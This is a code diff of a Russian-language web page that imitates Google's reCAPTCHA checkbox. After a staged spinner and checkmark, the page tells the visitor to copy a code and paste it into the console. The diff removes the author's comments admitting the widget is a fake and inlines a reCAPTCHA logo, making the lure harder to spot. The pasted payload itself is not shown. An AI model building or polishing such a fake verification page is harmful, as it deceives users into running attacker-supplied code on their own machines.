@@ -25,7 +25,6 @@
         h2 { color: #1a73e8; margin-bottom: 10px; font-size: 22px; }
         p { color: #5f6368; font-size: 14px; margin-bottom: 25px; }
         
-        /* Стили оригинального виджета reCAPTCHA */
         .recaptcha-widget-mock {
             display: flex;
             align-items: center;
@@ -63,11 +62,10 @@
             font-weight: 400;
         }
         
-        /* Анимация крутилки (spinner) */
         .spinner {
             display: none;
-            width: 24px;
-            height: 24px;
+            width: 22px;
+            height: 22px;
             border: 3px solid #4d90fe;
             border-radius: 50%;
             border-top-color: transparent;
@@ -77,7 +75,6 @@
         }
         @keyframes spin { to { transform: rotate(360deg); } }
 
-        /* Зеленая галочка */
         .checkmark {
             display: none;
             width: 28px;
@@ -95,15 +92,14 @@
             transform: rotate(45deg);
         }
 
-        /* Логотип Google */
         .logo-section {
             display: flex;
             flex-direction: column;
             align-items: center;
             justify-content: center;
-            width: 70px;
+            width: 75px;
         }
-        .logo-section img {
+        .logo-section svg {
             width: 32px;
             height: 32px;
         }
@@ -111,6 +107,7 @@
             font-size: 8px;
             color: #555;
             margin-top: 2px;
+            font-family: Roboto, helvetica, arial, sans-serif;
         }
         .logo-section a {
             font-size: 8px;
@@ -118,7 +115,6 @@
             text-decoration: none;
         }
 
-        /* Поле вывода токена */
         .token-box {
             display: none;
             margin-top: 25px;
@@ -138,17 +134,14 @@
             const spinner = document.getElementById('spin');
             const checkmark = document.getElementById('check');
             
-            // Отключаем клики во время анимации
             document.getElementById('clickzone').style.pointerEvents = 'none';
             checkbox.style.borderColor = 'transparent';
             spinner.style.display = 'block';
 
-            // Имитируем "размышление" Google над нашей человечностью (1.5 секунды)
             setTimeout(() => {
                 spinner.style.display = 'none';
                 checkmark.style.display = 'block';
                 
-                // Плавное появление токены
                 setTimeout(() => {
                     document.getElementById('widget').style.display = 'none';
                     document.getElementById('desc').innerText = 'Проверка успешно пройдена! Скопируйте код и вставьте в консоль:';
@@ -159,7 +152,7 @@
                     tokenBox.style.display = 'block';
                 }, 600);
 
-            }, 1500);
+            }, 1200);
         }
     </script>
 </head>
@@ -169,7 +162,6 @@
     <h2>Проверка безопасности</h2>
     <p id="desc">Для продолжения работы с матрицей подтвердите, что вы не робот.</p>
     
-    <!-- Самодельный фейк-виджет, идентичный оригиналу -->
     <div class="recaptcha-widget-mock" id="widget">
         <div class="checkbox-container" id="clickzone" onclick="triggerCaptcha()">
             <div class="checkbox-mock" id="box">
@@ -179,8 +171,13 @@
             <div class="checkbox-text">Я не робот</div>
         </div>
         <div class="logo-section">
-            <img src="https://gstatic.com" alt="reCAPTCHA">
-            <span>reCAPTCHA</span>
+            <!-- Встроенный SVG логотип reCAPTCHA вместо внешней картинки -->
+            <svg viewBox="0 0 24 24">
+                <path fill="#4A90E2" d="M12,2A10,10 0 0,0 2,12A10,10 0 0,0 12,22A10,10 0 0,0 22,12A10,10 0 0,0 12,2M12,4A8,8 0 0,1 20,12A8,8 0 0,1 12,20A8,8 0 0,1 4,12A8,8 0 0,1 12,4Z" />
+                <path fill="#4A90E2" d="M12,6A6,6 0 0,0 6,12A6,6 0 0,0 12,18A6,6 0 0,0 18,12A6,6 0 0,0 12,6M12,8A4,4 0 0,1 16,12A4,4 0 0,1 12,16A4,4 0 0,1 8,12A4,4 0 0,1 12,8Z" />
+                <circle cx="12" cy="12" r="2" fill="#1A73E8"/>
+            </svg>
+            <span style="font-weight: 500; color: #555;">reCAPTCHA</span>
             <span style="font-size:7px; color:#9b9b9b;"><a href="#">Конфиденциальность</a> - <a href="#">Условия</a></span>
         </div>
     </div>
